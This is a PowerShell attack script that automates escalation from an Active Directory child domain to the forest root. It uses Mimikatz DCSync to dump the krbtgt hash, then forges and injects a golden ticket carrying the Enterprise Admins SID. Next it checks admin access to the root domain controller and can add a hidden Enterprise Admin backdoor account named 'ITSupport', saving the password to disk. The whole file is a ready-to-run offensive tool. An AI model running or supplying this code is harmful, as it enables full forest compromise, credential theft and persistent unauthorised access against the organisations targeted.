# AD Forest Takeover with Extra SIDs
# This script automates the privilege escalation from child domain to forest root domain
# Version: 1.5

#Requires -Version 3

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$ChildDomain = "",
    
    [Parameter(Mandatory=$false)]
    [string]$RootDomain = "",
    
    [Parameter(Mandatory=$false)]
    [string]$MimikatzPath = ".\mimikatz.exe",
    
    [switch]$AutoExecute = $false,
    
    [switch]$Cleanup = $false,
    
    [string]$OutputPath = (Join-Path $env:TEMP "ForestTakeover")
)

function Write-LogMessage {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message,
        
        [Parameter(Mandatory=$false)]
        [ValidateSet("INFO", "SUCCESS", "WARNING", "ERROR")]
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    # Set color based on level
    switch ($Level) {
        "INFO"    { $color = "Cyan" }
        "SUCCESS" { $color = "Green" }
        "WARNING" { $color = "Yellow" }
        "ERROR"   { $color = "Red" }
        default   { $color = "White" }
    }
    
    # Write to console
    Write-Host $logMessage -ForegroundColor $color
    
    # Log to file if OutputPath is set
    if ($OutputPath) {
        $logFile = Join-Path $OutputPath "forest_takeover.log"
        $logMessage | Out-File -FilePath $logFile -Append
    }
}

function Test-AdminPrivilege {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-DomainConnectivity {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Domain
    )
    
    try {
        $domainCheck = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", $Domain)))
        Write-LogMessage "Successfully connected to domain: $Domain" -Level "SUCCESS"
        return $true
    }
    catch {
        $errMessage = $_.Exception.Message
        Write-LogMessage "Failed to connect to domain $Domain. Error: $errMessage" -Level "ERROR"
        return $false
    }
}

function Get-DomainSIDValue {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Domain
    )
    
    try {
        # Try using PowerView if available
        if (Get-Command "Get-DomainSID" -ErrorAction SilentlyContinue) {
            $SID = Get-DomainSID -Domain $Domain
            if ($SID) {
                return $SID
            }
        }
        
        # Fallback method 1: Using .NET
        $objDomain = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")
        $objDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
        return $objDomainSID.ToString()
    }
    catch {
        try {
            # Fallback method 2: Using WMI
            $CompSys = Get-WmiObject -Class Win32_ComputerSystem
            $domainRole = $CompSys.DomainRole
            
            if ($domainRole -ge 3) {
                # Domain controller
                $WMISID = (Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$Domain' AND Name='Administrator'").SID
                return ($WMISID -split "-")[0..($WMISID.Split("-").Count - 2)] -join "-"
            }
            else {
                # Not a domain controller, try querying users
                $anyDomainUser = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$Domain'" | Select-Object -First 1
                if ($anyDomainUser) {
                    return ($anyDomainUser.SID -split "-")[0..($anyDomainUser.SID.Split("-").Count - 2)] -join "-"
                }
            }
        }
        catch {
            $errMessage = $_.ToString()
            Write-LogMessage "Failed to get domain SID for $Domain using fallback methods. Error: $errMessage" -Level "ERROR"
            return $null
        }
    }
}

function Invoke-MimikatzCommand {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Command
    )
    
    if (-not (Test-Path $MimikatzPath)) {
        Write-LogMessage "Mimikatz not found at $MimikatzPath" -Level "ERROR"
        return $null
    }
    
    $commandFile = Join-Path $OutputPath "mimikatz_command.txt"
    $outputFile = Join-Path $OutputPath "mimikatz_output.txt"
    
    # Create command file
    $Command | Out-File -FilePath $commandFile -Encoding ASCII
    
    try {
        if ($AutoExecute) {
            Write-LogMessage "Executing Mimikatz command automatically" -Level "INFO"
            
            # Method 1: Using Start-Process with arguments
            try {
                # Delete existing output file if it exists to prevent confusion
                if (Test-Path $outputFile) {
                    Remove-Item -Path $outputFile -Force
                }
                
                # Execute Mimikatz with log command
                $argumentList = "log `"$outputFile`" `"$Command`" exit"
                $process = Start-Process -FilePath $MimikatzPath -ArgumentList $argumentList -NoNewWindow -PassThru
                $process.WaitForExit(10000) # Wait up to 10 seconds
                
                if (-not $process.HasExited) {
                    Write-LogMessage "Mimikatz process did not exit in time, forcing termination" -Level "WARNING"
                    $process.Kill()
                }
                
                # Wait a moment for file to be written
                Start-Sleep -Seconds 1
                
                if (Test-Path $outputFile) {
                    $output = Get-Content -Path $outputFile -Raw
                    if ($output) {
                        Write-LogMessage "Successfully retrieved Mimikatz output (Method 1)" -Level "SUCCESS"
                        return $output
                    }
                }
                
                Write-LogMessage "Method 1 failed to get output, trying Method 2..." -Level "WARNING"
            }
            catch {
                $errMessage = $_.ToString()
                Write-LogMessage "Method 1 exception: $errMessage" -Level "WARNING"
            }
            
            # Method 2: Using batch file
            try {
                $batchFile = Join-Path $OutputPath "mimikatz_exec.bat"
                $batchContent = @"
@echo off
"$MimikatzPath" "log $outputFile" "$Command" "exit"
"@
                $batchContent | Out-File -FilePath $batchFile -Encoding ASCII
                
                $process = Start-Process -FilePath $batchFile -NoNewWindow -PassThru
                $process.WaitForExit(10000)
                
                if (-not $process.HasExited) {
                    Write-LogMessage "Batch process did not exit in time, forcing termination" -Level "WARNING"
                    $process.Kill()
                }
                
                # Wait a moment for file to be written
                Start-Sleep -Seconds 1
                
                if (Test-Path $outputFile) {
                    $output = Get-Content -Path $outputFile -Raw
                    if ($output) {
                        Write-LogMessage "Successfully retrieved Mimikatz output (Method 2)" -Level "SUCCESS"
                        return $output
                    }
                }
                
                Write-LogMessage "Method 2 failed to get output, trying Method 3..." -Level "WARNING"
            }
            catch {
                $errMessage = $_.ToString()
                Write-LogMessage "Method 2 exception: $errMessage" -Level "WARNING"
            }
            
            # Method 3: Direct command execution
            try {
                $tempCmd = "cmd.exe /c $MimikatzPath `"$Command`" `"exit`" > `"$outputFile`""
                Invoke-Expression $tempCmd
                
                # Wait a moment for file to be written
                Start-Sleep -Seconds 1
                
                if (Test-Path $outputFile) {
                    $output = Get-Content -Path $outputFile -Raw
                    if ($output) {
                        Write-LogMessage "Successfully retrieved Mimikatz output (Method 3)" -Level "SUCCESS"
                        return $output
                    }
                }
                
                Write-LogMessage "All automatic methods failed" -Level "WARNING"
            }
            catch {
                $errMessage = $_.ToString()
                Write-LogMessage "Method 3 exception: $errMessage" -Level "WARNING"
            }
            
            # If we reach here, all automatic methods failed
            Write-LogMessage "Falling back to manual execution" -Level "WARNING"
            Write-Host "`n$MimikatzPath" -ForegroundColor Yellow
            Write-Host "$Command" -ForegroundColor Yellow
            Write-Host "exit`n" -ForegroundColor Yellow
            
            $manualOutput = Read-Host "After executing the command, paste the relevant output here"
            return $manualOutput
        }
        else {
            Write-LogMessage "Manual execution required. Please run the following command:" -Level "WARNING"
            Write-Host "`n$MimikatzPath" -ForegroundColor Yellow
            Write-Host "$Command" -ForegroundColor Yellow
            Write-Host "exit`n" -ForegroundColor Yellow
            
            $manualOutput = Read-Host "After executing the command, paste the relevant output here"
            return $manualOutput
        }
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Failed to execute Mimikatz command: $errMessage" -Level "ERROR"
        return $null
    }
    finally {
        if ($Cleanup) {
            # Clean up files but keep output file for debugging if needed
            if (Test-Path $commandFile) {
                Remove-Item -Path $commandFile -Force
            }
            if (Test-Path (Join-Path $OutputPath "mimikatz_exec.bat")) {
                Remove-Item -Path (Join-Path $OutputPath "mimikatz_exec.bat") -Force
            }
        }
    }
}

function Get-KrbtgtHash {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Domain
    )
    
    $netbiosDomain = $Domain.Split('.')[0]
    
    Write-LogMessage "Attempting to get krbtgt hash for domain $Domain" -Level "INFO"
    
    $dcsyncCommand = "privilege::debug
lsadump::dcsync /domain:$Domain /user:$netbiosDomain\krbtgt"
    
    $output = Invoke-MimikatzCommand -Command $dcsyncCommand
    
    if ($output) {
        # Try multiple patterns to extract the NTLM hash
        $patterns = @(
            "Hash NTLM: ([a-f0-9]{32})",
            "ntlm- 0: ([a-f0-9]{32})",
            "HashNTLM: ([a-f0-9]{32})",
            ": ([a-f0-9]{32})\s+\(rc4_hmac_nt\)"
        )
        
        foreach ($pattern in $patterns) {
            $hashMatch = $output | Select-String -Pattern $pattern -AllMatches
            if ($hashMatch.Matches.Count -gt 0) {
                $hash = $hashMatch.Matches[0].Groups[1].Value
                Write-LogMessage "Successfully retrieved krbtgt hash: $hash" -Level "SUCCESS"
                return $hash
            }
        }
        
        # If we get here, we couldn't extract the hash using known patterns
        # Let's save the output for manual inspection
        $outputFile = Join-Path $OutputPath "dcsync_output.txt"
        $output | Out-File -FilePath $outputFile
        Write-LogMessage "Could not automatically extract hash. Output saved to $outputFile" -Level "WARNING"
        Write-LogMessage "Please check the output file and look for the NTLM hash" -Level "WARNING"
        
        # Prompt user to manually enter the hash
        $manualHash = Read-Host "Please enter the krbtgt NTLM hash from the output"
        if ($manualHash -match "^[a-f0-9]{32}$") {
            Write-LogMessage "Using manually entered hash" -Level "SUCCESS"
            return $manualHash
        }
        else {
            Write-LogMessage "Invalid hash format entered" -Level "ERROR"
            return $null
        }
    }
    else {
        Write-LogMessage "Failed to get krbtgt hash" -Level "ERROR"
        return $null
    }
}

function Create-GoldenTicket {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Username,
        
        [Parameter(Mandatory=$true)]
        [string]$Domain,
        
        [Parameter(Mandatory=$true)]
        [string]$DomainSID,
        
        [Parameter(Mandatory=$true)]
        [string]$KrbtgtHash,
        
        [Parameter(Mandatory=$true)]
        [string]$ExtraSIDs
    )
    
    Write-LogMessage "Creating golden ticket for user $Username in domain $Domain" -Level "INFO"
    
    $goldenTicketCommand = "privilege::debug
kerberos::golden /user:$Username /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /sids:$ExtraSIDs /ptt"
    
    # First try: using Invoke-MimikatzCommand
    $output = Invoke-MimikatzCommand -Command $goldenTicketCommand
    
    # Check for success indicators in output
    if ($output -and ($output -like "*Golden ticket*successfully submitted*" -or 
                       $output -like "*successfully submitted for current session*" -or
                       $output -like "*kerberos::golden*OK*")) {
        Write-LogMessage "Golden ticket successfully created and injected" -Level "SUCCESS"
        return $true
    }
    else {
        Write-LogMessage "Automated golden ticket creation might have failed" -Level "WARNING"
        Write-LogMessage "Trying direct execution method..." -Level "INFO"
        
        # Save command to a batch file for direct execution
        $batchFile = Join-Path $OutputPath "create_ticket.bat"
        @"
@echo off
echo Running Mimikatz to create golden ticket...
"$MimikatzPath" "privilege::debug" "kerberos::golden /user:$Username /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /sids:$ExtraSIDs /ptt" "exit"
echo Done.
pause
"@ | Out-File -FilePath $batchFile -Encoding ASCII
        
        Write-LogMessage "Created batch file at $batchFile" -Level "INFO"
        
        if ($AutoExecute) {
            Write-LogMessage "Executing batch file..." -Level "INFO"
            Start-Process -FilePath $batchFile -Wait
            
            # Verify if we have tickets now
            $tickets = & klist
            if ($tickets -like "*$Username*" -or $tickets -like "*krbtgt*") {
                Write-LogMessage "Verified ticket injection through klist" -Level "SUCCESS"
                return $true
            }
        }
        else {
            Write-LogMessage "Please execute the batch file manually: $batchFile" -Level "WARNING"
            $response = Read-Host "Did you run the batch file and was the golden ticket created successfully? (Y/N)"
            if ($response -eq "Y" -or $response -eq "y") {
                return $true
            }
        }
        
        # Last resort: manual instructions
        Write-LogMessage "Direct execution might have failed. Please try manually:" -Level "WARNING"
        Write-Host "`nRun these commands manually:" -ForegroundColor Yellow
        Write-Host "$MimikatzPath" -ForegroundColor Yellow
        Write-Host "privilege::debug" -ForegroundColor Yellow
        Write-Host "kerberos::golden /user:$Username /domain:$Domain /sid:$DomainSID /krbtgt:$KrbtgtHash /sids:$ExtraSIDs /ptt" -ForegroundColor Yellow
        Write-Host "exit`n" -ForegroundColor Yellow
        
        $manualResponse = Read-Host "Did you run these commands and was the golden ticket created successfully? (Y/N)"
        if ($manualResponse -eq "Y" -or $manualResponse -eq "y") {
            return $true
        }
        
        Write-LogMessage "Failed to create or inject golden ticket" -Level "ERROR"
        return $false
    }
}

function Test-ForestAdminAccess {
    param (
        [Parameter(Mandatory=$true)]
        [string]$RootDC
    )
    
    Write-LogMessage "Testing forest admin access to $RootDC" -Level "INFO"
    
    try {
        # First try ping to make sure the DC is reachable
        $pingResult = Test-Connection -ComputerName $RootDC -Count 1 -Quiet -ErrorAction SilentlyContinue
        if (-not $pingResult) {
            Write-LogMessage "Cannot ping $RootDC. Network connectivity issue or firewall blocking ICMP." -Level "WARNING"
            Write-LogMessage "Continuing with access tests anyway..." -Level "INFO"
        }
        
        # Try multiple ways to check the admin share
        
        # Method 1: PowerShell Test-Path
        try {
            $accessTest = Test-Path "\\$RootDC\c$" -ErrorAction Stop
            if ($accessTest) {
                Write-LogMessage "Successfully accessed C$ share on $RootDC using Test-Path" -Level "SUCCESS"
                return $true
            }
        }
        catch {
            $errMessage = $_.ToString()
            Write-LogMessage "Test-Path failed: $errMessage" -Level "WARNING"
        }
        
        # Method 2: Use Get-ChildItem
        try {
            $items = Get-ChildItem -Path "\\$RootDC\c$" -ErrorAction Stop
            Write-LogMessage "Successfully accessed C$ share on $RootDC using Get-ChildItem" -Level "SUCCESS"
            return $true
        }
        catch {
            $errMessage = $_.ToString()
            Write-LogMessage "Get-ChildItem failed: $errMessage" -Level "WARNING"
        }
        
        # Method 3: Use CMD DIR command
        try {
            $dirOutput = cmd /c "dir \\$RootDC\c$" 2>&1
            if ($LASTEXITCODE -eq 0 -or $dirOutput -notlike "*Access is denied*") {
                Write-LogMessage "Successfully accessed C$ share on $RootDC using CMD" -Level "SUCCESS"
                return $true
            }
            else {
                Write-LogMessage "CMD DIR failed with output: $dirOutput" -Level "WARNING"
            }
        }
        catch {
            $errMessage = $_.ToString()
            Write-LogMessage "CMD DIR error: $errMessage" -Level "WARNING"
        }
    
        # Try PSExec if available
        if (Get-Command "PsExec.exe" -ErrorAction SilentlyContinue) {
            try {
                $tempFile = Join-Path $OutputPath "psexec_test.txt"
                Write-LogMessage "Testing access with PsExec..." -Level "INFO"
                
                # Use -nobanner to reduce output and make it easier to parse
                $psexecOutput = & PsExec.exe -accepteula -nobanner \\$RootDC cmd /c "whoami > $tempFile" 2>&1
                
                if ($LASTEXITCODE -eq 0) {
                    Write-LogMessage "Successfully executed command on $RootDC using PsExec" -Level "SUCCESS"
                    return $true
                }
                else {
                    Write-LogMessage "PsExec failed with exit code: $LASTEXITCODE" -Level "WARNING"
                    Write-LogMessage "PsExec output: $psexecOutput" -Level "WARNING"
                }
            }
            catch {
                $errMessage = $_.ToString()
                Write-LogMessage "Error with PsExec" -Level "ERROR"
            }
        }
        else {
            Write-LogMessage "PsExec.exe not found in path" -Level "WARNING"
        }
        
        # Try WMIC if available
        try {
            Write-LogMessage "Testing access with WMIC..." -Level "INFO"
            $wmicOutput = wmic /node:$RootDC process list brief 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-LogMessage "Successfully accessed $RootDC using WMIC" -Level "SUCCESS"
                return $true
            }
        }
        catch {
            $errMessage = $_.ToString()
            Write-LogMessage "WMIC error" -Level "WARNING"
        }
        
        # If we reach here, all methods failed
        Write-LogMessage "All methods failed to access $RootDC" -Level "ERROR"
        return $false
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Error in Test-ForestAdminAccess" -Level "ERROR"
        return $false
    }
}

function Get-DomainController {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Domain
    )
    
    try {
        # Try with .NET first
        $domainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain", $Domain)
        $domainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($domainContext)
        $dc = $domainObject.DomainControllers | Select-Object -First 1
        if ($dc) {
            return $dc.Name
        }
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Failed to get domain controller using .NET. Trying alternate methods." -Level "WARNING"
    }
    
    # Try with DNS
    try {
        $dcRecords = Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.$Domain" -Type SRV -ErrorAction Stop
        if ($dcRecords) {
            $dcName = $dcRecords[0].NameTarget
            return $dcName
        }
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Failed to get domain controller using DNS." -Level "WARNING"
    }
    
    # Last resort, try simple naming convention
    try {
        $netbiosDomain = $Domain.Split('.')[0]
        $potentialDC = "$netbiosDomain-DC" # or other naming conventions like DC01, etc.
        if (Test-Connection -ComputerName $potentialDC -Count 1 -Quiet) {
            return $potentialDC
        }
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Failed to find domain controller using naming convention." -Level "ERROR"
    }
    
    return $null
}

function Verify-KerberosTickets {
    # Try to verify Kerberos tickets using klist
    try {
        $klistOutput = & klist
        Write-LogMessage "Current Kerberos tickets:" -Level "INFO"
        Write-Host $klistOutput
        return $true
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Failed to list Kerberos tickets" -Level "ERROR"
        return $false
    }
}

function Establish-PersistentAccess {
    param (
        [Parameter(Mandatory=$true)]
        [string]$RootDomain,
        
        [Parameter(Mandatory=$true)]
        [string]$RootDC
    )
    
    $backdoorUser = "ITSupport"
    $backdoorPassword = "Str0ngP@ssw0rd!" + (Get-Random -Minimum 1000 -Maximum 9999)
    
    Write-LogMessage "Attempting to create backdoor access in $RootDomain" -Level "INFO"
    
    try {
        # Create user in the root domain
        $createUserResult = & net user $backdoorUser $backdoorPassword /add /domain:$RootDomain
        
        if ($LASTEXITCODE -eq 0) {
            Write-LogMessage "Successfully created user $backdoorUser in $RootDomain" -Level "SUCCESS"
            
            # Add to Enterprise Admins
            $addToGroupResult = & net group "Enterprise Admins" $backdoorUser /add /domain:$RootDomain
            
            if ($LASTEXITCODE -eq 0) {
                Write-LogMessage "Successfully added $backdoorUser to Enterprise Admins group" -Level "SUCCESS"
                Write-LogMessage "Backdoor credentials: Username: $backdoorUser, Password: $backdoorPassword" -Level "SUCCESS"
                
                # Save credentials to a file
                $credFile = Join-Path $OutputPath "backdoor_credentials.txt"
                "Domain: $RootDomain`nUsername: $backdoorUser`nPassword: $backdoorPassword" | Out-File -FilePath $credFile
                Write-LogMessage "Credentials saved to $credFile" -Level "INFO"
                
                return $true
            }
            else {
                Write-LogMessage "Failed to add user to Enterprise Admins group" -Level "ERROR"
            }
        }
        else {
            Write-LogMessage "Failed to create backdoor user" -Level "ERROR"
        }
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Error establishing persistent access" -Level "ERROR"
    }
    
    return $false
}

# Main script execution starts here
$ErrorActionPreference = "Continue"

# Create output directory if it doesn't exist
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath | Out-Null
    Write-LogMessage "Created output directory: $OutputPath" -Level "INFO"
}

# Check if running as admin
if (-not (Test-AdminPrivilege)) {
    Write-LogMessage "This script requires administrative privileges" -Level "ERROR"
    exit 1
}

# Load PowerView if available
$powerViewPath = Join-Path (Get-Location) "PowerView.ps1"
if (Test-Path $powerViewPath) {
    try {
        . $powerViewPath
        Write-LogMessage "PowerView loaded successfully" -Level "SUCCESS"
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Failed to load PowerView" -Level "WARNING"
    }
} else {
    Write-LogMessage "PowerView not found at $powerViewPath" -Level "WARNING"
    Write-LogMessage "Some domain enumeration features may be limited" -Level "WARNING"
}

# Auto-detect domains if not provided
if (-not $ChildDomain -or -not $RootDomain) {
    Write-LogMessage "Attempting to auto-detect domains..." -Level "INFO"
    
    try {
        $currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
        Write-LogMessage "Current domain: $currentDomain" -Level "INFO"
        
        # Set child domain to current domain
        if (-not $ChildDomain) {
            $ChildDomain = $currentDomain
            Write-LogMessage "Child domain set to current domain: $ChildDomain" -Level "INFO"
        }
        
        # Try to detect root domain
        if (-not $RootDomain) {
            $forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $RootDomain = $forest.RootDomain.Name
            Write-LogMessage "Root domain detected: $RootDomain" -Level "INFO"
        }
    }
    catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Failed to auto-detect domains" -Level "ERROR"
        Write-LogMessage "Please provide both ChildDomain and RootDomain parameters" -Level "ERROR"
        exit 1
    }
}

# Verify domain connectivity
if (-not (Test-DomainConnectivity -Domain $ChildDomain)) {
    Write-LogMessage "Cannot proceed without connectivity to the child domain" -Level "ERROR"
    exit 1
}

# Get domain SIDs
Write-LogMessage "Getting domain SIDs..." -Level "INFO"
$ChildDomainSID = Get-DomainSIDValue -Domain $ChildDomain
$RootDomainSID = Get-DomainSIDValue -Domain $RootDomain

if (-not $ChildDomainSID -or -not $RootDomainSID) {
    Write-LogMessage "Failed to obtain domain SIDs" -Level "ERROR"
    exit 1
}

Write-LogMessage "Child Domain SID: $ChildDomainSID" -Level "INFO"
Write-LogMessage "Root Domain SID: $RootDomainSID" -Level "INFO"

# Get Enterprise Admins SID
$EnterpriseAdminsSID = "$RootDomainSID-519"
Write-LogMessage "Enterprise Admins SID: $EnterpriseAdminsSID" -Level "INFO"

# Get krbtgt hash
$krbtgtHash = Get-KrbtgtHash -Domain $ChildDomain

if (-not $krbtgtHash) {
    Write-LogMessage "Failed to obtain krbtgt hash. Manual input required." -Level "WARNING"
    $krbtgtHash = Read-Host "Enter the krbtgt NTLM hash for $ChildDomain"
    
    if (-not $krbtgtHash) {
        Write-LogMessage "No krbtgt hash provided. Cannot continue." -Level "ERROR"
        exit 1
    }
}

# Create golden ticket
$ticketUser = "ForestAdmin"
$success = Create-GoldenTicket -Username $ticketUser -Domain $ChildDomain -DomainSID $ChildDomainSID -KrbtgtHash $krbtgtHash -ExtraSIDs $EnterpriseAdminsSID

if (-not $success) {
    Write-LogMessage "Failed to create golden ticket. Cannot continue." -Level "ERROR"
    exit 1
}

# Verify Kerberos tickets
Verify-KerberosTickets

# Get root domain controller
$RootDC = Get-DomainController -Domain $RootDomain
if (-not $RootDC) {
    Write-LogMessage "Failed to get root domain controller" -Level "ERROR"
    $RootDC = Read-Host "Enter the name of a domain controller in $RootDomain"
    
    if (-not $RootDC) {
        Write-LogMessage "No root domain controller provided. Cannot continue." -Level "ERROR"
        exit 1
    }
}

Write-LogMessage "Root domain controller: $RootDC" -Level "INFO"

# Verify Kerberos tickets again
Write-LogMessage "Verifying Kerberos tickets before testing access..." -Level "INFO"
Verify-KerberosTickets

# Attempt to list tickets to make sure they're in cache
Write-LogMessage "Running additional ticket verification..." -Level "INFO"
try {
    $tickets = & klist
    if ($tickets) {
        Write-Host $tickets
    } else {
        Write-LogMessage "No tickets found in cache. This may indicate a problem." -Level "WARNING"
    }
} catch {
    $errMessage = $_.ToString()
    Write-LogMessage "Error running klist" -Level "ERROR"
}

# Try to clear existing tickets and manually create a golden ticket as last resort if no tickets are found
$ticketsFound = $tickets -like "*krbtgt*" -or $tickets -like "*$ticketUser*" -or $tickets -like "*$RootDomain*"
if (-not $ticketsFound) {
    Write-LogMessage "No appropriate tickets found. Attempting one final golden ticket creation..." -Level "WARNING"
    
    try {
        # Clear existing tickets
        & klist purge
        Write-LogMessage "Cleared existing tickets" -Level "INFO"
        
        # Create direct batch file for ticket creation
        $ticketBatch = Join-Path $OutputPath "final_ticket.bat"
        @"
@echo off
echo Creating golden ticket with direct Mimikatz execution...
"$MimikatzPath" "privilege::debug" "kerberos::golden /user:$ticketUser /domain:$ChildDomain /sid:$ChildDomainSID /krbtgt:$KrbtgtHash /sids:$EnterpriseAdminsSID /ptt" "exit"
echo Golden ticket created. Press any key to continue...
pause > nul
"@ | Out-File -FilePath $ticketBatch -Encoding ASCII
        
        if ($AutoExecute) {
            Write-LogMessage "Executing final golden ticket attempt..." -Level "INFO"
            Start-Process -FilePath $ticketBatch -Wait
        } else {
            Write-LogMessage "Please run this batch file to create the golden ticket: $ticketBatch" -Level "WARNING"
            Read-Host "Press Enter after running the batch file"
        }
    } catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Error in final ticket creation attempt" -Level "ERROR"
    }
}

# Test access to root domain
Write-LogMessage "Testing access to root domain controller: $RootDC" -Level "INFO"
$forestAdminAccess = Test-ForestAdminAccess -RootDC $RootDC

if ($forestAdminAccess) {
    Write-LogMessage "Successfully compromised forest root domain!" -Level "SUCCESS"
    
    # Optional: Establish persistent access
    $createBackdoor = $false
    if (-not $AutoExecute) {
        $backdoorResponse = Read-Host "Do you want to establish persistent access to the forest? (y/n)"
        $createBackdoor = $backdoorResponse -eq "y"
    }
    
    if ($createBackdoor) {
        Establish-PersistentAccess -RootDomain $RootDomain -RootDC $RootDC
    }
    
    # Provide guidance on what to do next
    Write-LogMessage "You now have forest admin privileges. Some actions you can take:" -Level "INFO"
    Write-LogMessage "1. Access any domain controller in the forest: dir \\<DC_NAME>\c$" -Level "INFO"
    Write-LogMessage "2. Create backdoor accounts in any domain" -Level "INFO"
    Write-LogMessage "3. Extract domain secrets using DCSync from any domain" -Level "INFO"
    Write-LogMessage "4. Example DCSync command: mimikatz 'privilege::debug' 'lsadump::dcsync /domain:$RootDomain /user:administrator' 'exit'" -Level "INFO"
}
else {
    Write-LogMessage "Failed to verify forest admin access" -Level "ERROR"
    Write-LogMessage "Trying manual access verification..." -Level "WARNING"
    
    # Try one more time with direct command
    try {
        $manualTest = Read-Host "Try running 'dir \\$RootDC\c manually now. Did it work? (y/n)"
        if ($manualTest -eq "y" -or $manualTest -eq "Y") {
            Write-LogMessage "Manual verification confirmed! Forest compromise successful." -Level "SUCCESS"
        } else {
            Write-LogMessage "Possible issues:" -Level "INFO"
            Write-LogMessage "1. SID filtering may be enabled between domains" -Level "INFO"
            Write-LogMessage "2. The golden ticket may not have been properly created" -Level "INFO"
            Write-LogMessage "3. There might be network connectivity issues" -Level "INFO"
            Write-LogMessage "4. Try checking if SID history is disabled between domains" -Level "INFO"
            Write-LogMessage "5. Command to check SID filtering: netdom trust $RootDomain /domain:$ChildDomain /quarantine:No" -Level "INFO"
        }
    } catch {
        $errMessage = $_.ToString()
        Write-LogMessage "Error during manual verification" -Level "ERROR"
    }
}

# Clean up if requested
if ($Cleanup) {
    Write-LogMessage "Cleaning up temporary files..." -Level "INFO"
    # Don't remove the entire directory as it contains the log file
    Get-ChildItem -Path $OutputPath -Exclude "forest_takeover.log", "backdoor_credentials.txt" | Remove-Item -Force -Recurse
    Write-LogMessage "Cleanup completed" -Level "SUCCESS"
}

Write-LogMessage "Script execution completed" -Level "INFO"
